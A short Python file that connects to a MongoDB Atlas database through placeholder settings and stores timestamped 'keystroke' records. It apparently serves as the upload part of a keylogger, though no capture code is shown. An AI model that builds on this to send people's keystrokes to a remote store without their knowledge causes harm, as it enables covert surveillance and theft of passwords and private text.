import pymongo
import time
import datetime

def database_init():
    # returns a writable collection as a value to push data to
    client = pymongo.MongoClient("<reference to MongoDB Atlas database>")
    db = client.get_database("<database_name>")
    collection = db.get_collection('<collection_name>')
    return collection

def message_format(message, collection):
    keystroke = dict()
    keystroke["message"] = (message)
    keystroke["date"] = ("month=" + str(datetime.datetime.now().month) 
    + " day=" + str(datetime.datetime.now().day) + " " 
    + "hour=" + str(datetime.datetime.now().hour) + " "
    + "minute=" + str(datetime.datetime.now().minute) + " "
    + "second=" + str(datetime.datetime.now().second))

    collection.insert_one(keystroke)
